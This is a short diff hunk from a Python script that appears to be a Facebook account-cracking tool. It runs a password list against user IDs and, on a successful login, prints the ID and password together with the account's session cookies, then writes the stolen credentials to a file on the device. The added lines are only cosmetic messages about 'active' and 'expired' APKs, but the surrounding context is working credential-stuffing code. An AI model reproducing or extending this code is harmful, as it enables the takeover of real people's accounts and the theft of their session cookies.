@@ -213,6 +213,10 @@ def m1(ids,names,passlist):
             if 'session_key' in req:
                 coki = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                 print('\r\r \033[1;32m[ALIVE] '+ids+'|'+pas)
+                print(f'\r %s[%s!%s] %sSorry, there are no active APKs%s  ' % (N, M, N, M, N))
+                print(f'\r 🎮  %sYour Active Application Details :' % (H))
+                print(f'\r %s[%s!%s] %sSorry, there are no expired APKs%s           \n' % (N, M, N, M, N))
+                print(f'\r 🎮  %sYour Expired Application Details :' % (M))
                 print('\r\r \033[1;33m[FB-LINK]\033[1;34m https://www.facebook.com/'+ids)
                 print('\033[1;32m [COOKIES] \033[1;36m'+coki)
                 open('/sdcard/DR4X-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
